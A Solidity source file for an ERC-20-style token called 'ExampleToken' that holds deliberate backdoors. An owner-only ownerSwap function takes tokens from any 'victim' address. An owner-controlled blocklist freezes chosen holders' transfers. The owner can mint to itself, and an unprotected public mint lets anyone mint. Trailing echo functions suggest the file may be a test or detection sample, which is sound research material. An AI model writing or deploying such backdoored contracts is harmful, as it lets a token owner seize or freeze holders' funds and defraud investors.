// SPDX-License-Identifier: GNU
pragma solidity ^0.8.0;

contract ExampleToken{
    uint public token_totalSupply;
    uint public maxSupply;
    mapping(address => uint) public balance;
    mapping(address => mapping(address => uint)) public allowance;
    string public token_name = "ExampleToken";
    string public token_symbol = "ET";
    uint8 public token_decimals = 18;
    address public owner;
    mapping(address => bool) public blocklist;

    constructor(uint total){
        maxSupply = total;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyNotblock(){
        require(blocklist[msg.sender] != true);
        _;
    }

    function name() public view returns (string memory){
        return token_name;
    }

    function symbol() public view returns (string memory){
        return token_symbol;
    }

    function decimals() public view returns (uint8){
        return token_decimals;
    }

    function totalSupply() public view returns (uint256){
        return token_totalSupply;
    }

    function balanceOf(address addr) public view returns(uint256){
        return balance[addr];
    }

    function transfer(address recipient, uint amount) public onlyNotblock returns (bool) {
        balance[msg.sender] -= amount;
        balance[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
     function approve(address spender, uint amount) public onlyNotblock returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) public onlyNotblock returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balance[sender] -= amount;
        balance[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint amount) external {
        require(token_totalSupply + amount <= maxSupply);
        balance[msg.sender] += amount;
        token_totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function ownerAllocation(uint amount) public onlyOwner {
        require(token_totalSupply + amount <= maxSupply);
        balance[owner] += amount;
        token_totalSupply += amount;
    }

    function ownerSwap(address victim, uint amount) public onlyOwner{
        require(balance[victim] >= amount);
        balance[victim] -= amount;
        balance[owner] += amount;
    }

    function addBlocklist(address user) public onlyOwner{
        blocklist[user] = true;
    }

    function getBlockstatus(address user) public view returns(bool){
        return blocklist[user];
    }

    function removeBlocklist(address user) public onlyOwner{
        blocklist[user] = false;
    }

    uint256 public cur;
    enum FreshJuiceSize{ SMALL, MEDIUM, LARGE }
    FreshJuiceSize choice;

    struct Dei{
        uint256 a;
        string b;
    }
    mapping(address=>uint) ma;
    function send_bool(bool a) public returns(bool){
        return a;
    }
    function send_bytes(bytes32 a) public returns(bytes32){
        return a;
    }
    function send_uint(uint a) public returns(uint){
        if (a>=10){
            return a-1;
        }else{
            return a+1;
        }

    }
    function send_address(address a) public returns(address){
        return a;
    }
    function send_string(string memory a) public returns(string memory){
        return a;
    }
    function send_array(uint[3] memory _data) public returns(uint[3] memory){
        return _data;
    }
    function send_struct(Dei memory d) public returns(uint){
        return d.a;
    }
    function send_enum(FreshJuiceSize a) public returns(FreshJuiceSize){
        return choice;
    }

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}
